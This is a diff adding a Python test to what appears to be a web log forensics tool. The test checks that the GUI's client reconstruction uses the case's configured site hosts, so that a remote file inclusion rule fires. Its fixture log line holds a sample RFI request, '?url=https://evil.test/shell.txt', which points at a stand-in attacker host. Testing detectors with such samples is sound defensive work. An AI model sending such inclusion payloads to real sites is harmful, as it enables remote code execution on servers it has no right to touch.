@@ -283,3 +283,40 @@ def test_a_case_that_already_has_an_answer_is_not_asked_again(tmp_path: Path) ->
     case.set_site_hosts(["shop.test"])
 
     assert not case.suggest_site_hosts().worth_asking
+
+
+# -- the window reconstructs with the case's own engine ----------------------
+
+
+def test_the_window_s_reconstruction_honours_the_case_s_domains(tmp_path: Path) -> None:
+    """**Found 2026-09-23: the domain question did nothing in the window.**
+
+    `caseview.reconstruct_client` — the path the GUI takes — called
+    `analyse_ip` without an engine, so `analyse_ip` built its default one with
+    no `site_hosts`. The dialog asked, saved the answer and reloaded the case,
+    and the reconstruction on screen then ignored it: `rfi_offsite_url` could
+    fire from the command line and from triage, and never from the window.
+
+    That is the exact disagreement `Case.rule_engine()` exists to make
+    impossible, and one call site had been missed. Asserted through the
+    function the window calls rather than through the window, because the
+    defect is in which engine is built and not in anything Qt draws.
+    """
+    from logarc.caseview import reconstruct_client
+
+    case_dir = tmp_path / "case"
+    lines = [
+        "203.0.113.7 - - [10/Oct/2020:14:00:00 +0000] "
+        '"GET /page?url=https://evil.test/shell.txt HTTP/1.1" 200 120 "-" "curl/8.0"',
+    ]
+    with Case.create(case_dir) as case:
+        case.ingest([write_log(tmp_path / "rfi.log", lines)])
+    with Case.open(case_dir) as case:
+        case.set_site_hosts(["shop.test"])
+        crs = case.crs_evidence()
+
+    result = reconstruct_client(case_dir, "203.0.113.7", crs)
+
+    fired = {a.labelled.label.rule_id for a in result.assignments}
+    assert "rfi_offsite_url" in fired, f"the window saw only {sorted(fired)}"
+    assert result.site_hosts == ("shop.test",), "and the report must say what it compared against"
